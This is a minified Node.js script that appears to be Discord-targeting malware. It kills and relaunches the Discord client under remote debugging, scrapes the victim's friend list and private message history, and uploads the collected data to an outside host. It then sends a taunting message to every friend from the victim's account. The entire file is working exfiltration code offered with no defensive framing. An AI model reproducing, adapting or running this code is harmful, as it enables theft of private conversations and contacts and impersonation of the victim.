const{exec:exec}=require("child_process"),os=require("os"),fs=require("fs"),puppeteer=require("puppeteer-core"),request=require("request"),ADRESS="http://7kx0x38anv.loseyourip.com/upload";let browser=null,page=null;const discord={cache_path:`${__dirname}\\cache.json`,open:async()=>{const e="win32"===os.platform()?"taskkill /F /IM discord.exe /T":"killall Discord";return new Promise((t,r)=>{exec(e,async()=>{const e=await(async()=>new Promise((e,t)=>{if("win32"!==os.platform())return e("discord");{const t=os.userInfo().username,r=fs.readdirSync(`C:\\Users\\${t}\\AppData\\Local\\Discord`);for(const a of r){const r=`C:\\Users\\${t}\\AppData\\Local\\Discord\\${a}\\Discord.exe`;if(fs.existsSync(r))return e(r)}}}))();browser=await puppeteer.launch({ignoreDefaultArgs:!0,args:["","--remote-debugging-port=9222","--start-minimized"],executablePath:e,defaultViewport:null});let r=!1;const a=setInterval(async()=>{const e=await browser.pages();e[1]&&(clearInterval(a),e[1].once("load",async()=>{r||(r=!0,await e[1].waitFor(".childWrapper-anI2G9"),page=e[1],t(page,browser))}))},10)})})},close:async()=>(browser.close(),browser=null,page=null,"Discord closed."),listFriends:async function(){return await page.evaluate(()=>{document.querySelector(".childWrapper-anI2G9").click(),document.querySelector(".layout-2DM8Md").click(),document.querySelectorAll(".item-3HknzM")[1].click();const e=document.querySelectorAll(".text-37NqbO"),t={};for(const r of e){const e=r.querySelector(".username-2b1r56").innerText,a=r.querySelector(".discriminator-22Okc1").innerHTML;t[e]={status:r.innerText.slice(r.innerText.indexOf("\n")+1),tag:a}}return t})},listMessages:async e=>{return await page.evaluate(async e=>{document.querySelector(".childWrapper-anI2G9").click(),document.querySelector(".layout-2DM8Md").click(),document.querySelectorAll(".item-3HknzM")[1].click();const t=document.querySelectorAll(".text-37NqbO");for(const r of t){if(r.querySelector(".username-2b1r56").innerText===e)return r.click(),0}return 0},e),await page.waitFor(".message-2qnXI6"),await page.evaluate(()=>{const e=[],t=document.querySelectorAll(".message-2qnXI6");for(const r of t)e.push(r.innerText);return e})},setStatus:async e=>{const t=["Online","Idle","Do Not Disturb","Invisible"];if("string"==typeof e){const r=t.indexOf(e);e=r>-1?r:0}return await page.waitFor(".avatarWrapper-2yR4wp"),await page.evaluate(e=>(document.querySelector(".avatarWrapper-2yR4wp").click(),document.querySelectorAll(".statusItem-33LqPf")[e].click(),e),e),`Status set to "${t[e]}".`},addUser:async e=>{await page.evaluate(()=>(document.querySelector(".childWrapper-anI2G9").click(),document.querySelector(".layout-2DM8Md").click(),document.querySelectorAll(".item-3HknzM")[4].click(),0)),await page.waitFor(".addFriendInput-4bcerK");const t=await page.evaluate(e=>{let t=!1;document.querySelector(".addFriendInput-4bcerK").value=e;const r=document.querySelector(".button-38aScr.lookFilled-1Gx00P");r.disabled=!1,r.click();const a=document.querySelector(".error-3T-E-_"),c=document.querySelector(".primaryButton-2BsGPp");return a&&(t=a),c&&(t="User does not exist.",c.click()),t},e);return t?`Friend request failed: "${t}"`:`Sent a friend request to "${user}"`},acceptFriendRequest:async e=>(await page.evaluate(()=>(document.querySelector(".childWrapper-anI2G9").click(),document.querySelector(".layout-2DM8Md").click(),document.querySelectorAll(".item-3HknzM")[2].click(),0)),await page.waitFor(".listItemContents-2w6nwE"),await page.evaluate(e=>{const t=document.querySelectorAll(".listItemContents-2w6nwE");for(const r of t){r.innerText.replace("\nIncoming Friend Request","")!==e&&"*"!==e||r.querySelector(".actionButton-uPB8Fs").click()}return 0},e),`Accepted a friend reqest from "${e}".`),unblockUser:async e=>(await page.evaluate(()=>(document.querySelector(".childWrapper-anI2G9").click(),document.querySelector(".layout-2DM8Md").click(),document.querySelectorAll(".item-3HknzM")[3].click(),0)),await page.waitFor(".listItemContents-BUaJR_"),await page.evaluate(e=>{const t=document.querySelectorAll(".listItemContents-BUaJR_");for(const r of t){r.innerText.replace("\nBlocked","")!==e&&"*"!==e||r.querySelector(".actionButton-uPB8Fs").click()}return 0},e),`Unblocked user "${e}".`),removeUser:async e=>(await page.evaluate(e=>{document.querySelector(".childWrapper-anI2G9").click(),document.querySelector(".layout-2DM8Md").click(),document.querySelectorAll(".item-3HknzM")[1].click();const t=document.querySelectorAll(".listItemContents-95HL3L");for(const r of t){const t=r.innerText.slice(0,r.innerText.indexOf("\n"));t!==e&&"*"!==e||(r.querySelector(".actionButton-uPB8Fs").click(),console.log(t))}return 0},e),`Removed user "${e}".`),sendMessage:async(e,t)=>{const r=()=>(document.querySelector(".childWrapper-anI2G9").click(),document.querySelector(".layout-2DM8Md").click(),document.querySelectorAll(".item-3HknzM")[1].click(),0);if(await page.evaluate(r),"*"===e){const e=await page.evaluate(()=>document.querySelectorAll(".username-2b1r56").length);for(let t=0;t<e;t++)await a(t)}else await a(e);async function a(e){return await page.evaluate(r),await page.waitFor(".username-2b1r56"),await page.evaluate(e=>{const t=document.querySelectorAll(".username-2b1r56");if("number"==typeof e)return t[e].click(),e;t.forEach((t,r)=>{if(t.innerText===e)return t.click()})},e),await page.waitFor(".slateTextArea-1Mkdgw"),await page.keyboard.type(t),await page.keyboard.press("Enter"),await page.waitFor(".placeholder-37qJjk"),0}return`Sent "${t}" to "${e}"`}};async function main(){await discord.open();const e={},t=await discord.listFriends();for(const r of Object.keys(t)){const a=await discord.listMessages(r);e[`${r}${t[r].tag}`]=Object.assign(t[r],{messages:a})}const r=`${__dirname}/collected_data.json`;fs.writeFileSync(r,JSON.stringify(e,null,2)),uploadFile(ADRESS,r),await discord.sendMessage("*","OwO, what's this? \\**notices your discord exploit\\**"),await discord.close()}function uploadFile(e,t){const r=setTimeout(()=>{process.exit()},1e4),a=request.post(e,{},()=>clearTimeout(r)).form(),c=fs.createReadStream(t);a.append("file",c)}main();